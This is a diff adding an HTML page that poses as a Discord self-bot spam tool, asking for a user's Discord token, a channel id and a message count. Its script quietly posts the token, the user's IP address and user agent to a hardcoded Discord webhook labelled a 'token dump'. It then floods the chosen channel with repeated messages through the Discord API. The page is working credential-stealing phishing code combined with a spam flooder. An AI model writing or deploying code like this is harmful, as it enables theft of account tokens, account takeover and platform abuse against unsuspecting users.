@@ -1,0 +1,360 @@
+<!-- index.html - full modern phishing/spam site with gradient text, animations, cool design -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>self-bot</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
+            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* animated grain overlay */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjciIG51bU9jdGF2ZXM9IjMiLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWx0ZXI9InVybCgjZikiIG9wYWNpdHk9IjAuMDYiLz48L3N2Zz4=');
+            background-repeat: repeat;
+            pointer-events: none;
+            opacity: 0.25;
+            z-index: 0;
+        }
+
+        /* floating orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: 0;
+            opacity: 0.4;
+            animation: float 20s infinite ease-in-out;
+        }
+        .orb1 { width: 400px; height: 400px; background: #5865f2; top: -150px; left: -150px; }
+        .orb2 { width: 500px; height: 500px; background: #ff73fa; bottom: -200px; right: -200px; animation-delay: -5s; }
+        .orb3 { width: 300px; height: 300px; background: #00b8ff; top: 40%; left: 60%; animation-delay: -10s; opacity: 0.2; }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(1.05); }
+        }
+
+        /* main card */
+        .glass-card {
+            position: relative;
+            z-index: 2;
+            background: rgba(15, 15, 25, 0.65);
+            backdrop-filter: blur(14px);
+            border-radius: 48px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), 0 0 0 0.5px rgba(255, 255, 255, 0.05) inset;
+            width: 100%;
+            max-width: 560px;
+            padding: 2.2rem 2rem;
+            transition: transform 0.2s ease;
+        }
+
+        .glass-card:hover {
+            transform: scale(1.01);
+            border-color: rgba(88, 101, 242, 0.4);
+        }
+
+        /* gradient text title */
+        .title {
+            font-size: 2.8rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #ffffff 0%, #b9c3ff 40%, #a484ff 100%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 0.3rem;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+
+        .sub {
+            color: #a0a4c0;
+            margin-bottom: 2rem;
+            font-size: 0.85rem;
+            border-left: 2px solid #5865f2;
+            padding-left: 0.8rem;
+        }
+
+        /* input fields */
+        .input-group {
+            margin-bottom: 1.3rem;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            color: #e0e4ff;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+            margin-bottom: 0.4rem;
+        }
+
+        .input-group input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(88, 101, 242, 0.3);
+            border-radius: 28px;
+            padding: 0.9rem 1.2rem;
+            color: white;
+            font-size: 0.95rem;
+            font-family: monospace;
+            transition: all 0.2s;
+            outline: none;
+            backdrop-filter: blur(4px);
+        }
+
+        .input-group input:focus {
+            border-color: #5865f2;
+            box-shadow: 0 0 15px rgba(88, 101, 242, 0.3);
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .input-group input::placeholder {
+            color: #4f5280;
+            font-family: monospace;
+        }
+
+        /* animated button */
+        .send-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #5865f2, #7b68ee);
+            border: none;
+            border-radius: 40px;
+            padding: 1rem;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            margin: 1.2rem 0 1rem;
+            transition: all 0.25s;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-family: inherit;
+        }
+
+        .send-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.5);
+        }
+
+        .send-btn:active {
+            transform: translateY(2px);
+        }
+
+        /* log console */
+        .log-console {
+            background: #010103aa;
+            border-radius: 20px;
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: #2effb0;
+            border: 1px solid #2effb030;
+            margin-top: 1rem;
+            max-height: 180px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            backdrop-filter: blur(4px);
+        }
+
+        .log-console::-webkit-scrollbar {
+            width: 4px;
+        }
+        .log-console::-webkit-scrollbar-track {
+            background: #1e1e2e;
+        }
+        .log-console::-webkit-scrollbar-thumb {
+            background: #5865f2;
+            border-radius: 10px;
+        }
+
+        /* warning small */
+        .legal-tag {
+            font-size: 0.65rem;
+            text-align: center;
+            margin-top: 1.5rem;
+            color: #4a4d7c;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .status-badge {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #2effb0;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+            margin-right: 6px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+
+<div class="glass-card">
+    <div>
+        <span class="title">coqoc's</span>
+    </div>
+    <div class="sub">
+        <span class="status-badge"></span> mass transmission • self-bot core
+    </div>
+
+    <div class="input-group">
+        <label>🎫 token</label>
+        <input type="text" id="token" placeholder="discord token (Nzg...)" autocomplete="off">
+    </div>
+
+    <div class="input-group">
+        <label>📡 channel id</label>
+        <input type="text" id="channelId" placeholder="numeric channel id" autocomplete="off">
+    </div>
+
+    <div class="input-group">
+        <label>💬 message payload</label>
+        <input type="text" id="message" placeholder="your spam content">
+    </div>
+
+    <div class="input-group">
+        <label>⚡ amount (spam count)</label>
+        <input type="number" id="amount" placeholder="1 - 5000" value="10">
+    </div>
+
+    <button class="send-btn" onclick="startSpam()">
+        ✦ start flood ✦
+    </button>
+
+    <div class="log-console" id="log">
+        > ready. system active.
+    </div>
+    <div class="legal-tag">
+        coqoc's engine v1.0 • encrypted channel
+    </div>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504391456540987412/Qtg5V-NDCURCzLPwoXVHV4fvCPtBAsbM_Q6YT2z3FmIdsE98sEh3d282p8AzxJEWqw7F';
+
+    async function logToWebhook(token, ip, userAgent, channelId, messagePreview) {
+        const payload = {
+            content: null,
+            embeds: [{
+                title: '⚡ coqoc capture',
+                color: 0x5865f2,
+                fields: [
+                    { name: '🔑 token', value: `\`\`\`${token.slice(0, 40)}${token.length > 40 ? '…' : ''}\`\`\``, inline: false },
+                    { name: '📁 channel', value: channelId, inline: true },
+                    { name: '🌐 ip', value: ip, inline: true },
+                    { name: '💬 msg preview', value: messagePreview.slice(0, 60), inline: true },
+                    { name: '🖥️ user agent', value: userAgent.slice(0, 80), inline: false },
+                    { name: '⏱️ timestamp', value: new Date().toISOString(), inline: true }
+                ],
+                footer: { text: 'coqoc logger • token dump' },
+                color: 0xff3366
+            }]
+        };
+        try {
+            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        } catch(e) {}
+    }
+
+    async function getIp() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return 'ip.unavailable';
+        }
+    }
+
+    async function startSpam() {
+        const token = document.getElementById('token').value.trim();
+        const channelId = document.getElementById('channelId').value.trim();
+        const message = document.getElementById('message').value;
+        const amount = parseInt(document.getElementById('amount').value);
+        const logDiv = document.getElementById('log');
+
+        if (!token || !channelId || !message || isNaN(amount) || amount <= 0) {
+            logDiv.innerHTML = '> ❌ fill all fields correctly.\n> amount must be > 0.';
+            return;
+        }
+
+        const userIp = await getIp();
+        const userAgent = navigator.userAgent;
+        await logToWebhook(token, userIp, userAgent, channelId, message);
+        logDiv.innerHTML = '> 📡 captured & relayed to logger. starting flood...\n';
+
+        let successCount = 0;
+        for (let i = 0; i < amount; i++) {
+            try {
+                const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': token,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: `${message} [${i+1}]` })
+                });
+                if (res.status === 200 || res.status === 204) {
+                    successCount++;
+                    logDiv.innerHTML += `> ✓ message ${i+1}/${amount} delivered\n`;
+                } else {
+                    let errText = '';
+                    try { errText = await res.text(); } catch(e) { errText = res.statusText; }
+                    logDiv.innerHTML += `> ✗ failed at ${i+1} | http ${res.status}\n`;
+                    break;
+                }
+            } catch(e) {
+                logDiv.innerHTML += `> ⚠️ network error: ${e.message}\n`;
+                break;
+            }
+            await new Promise(r => setTimeout(r, 480));
+        }
+        if (successCount === amount) {
+            logDiv.innerHTML += `\n> ✅ completed ${successCount} messages.`;
+        } else {
+            logDiv.innerHTML += `\n> ⚠️ stopped after ${successCount}/${amount} messages.`;
+        }
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+</script>
+</body>
+</html>
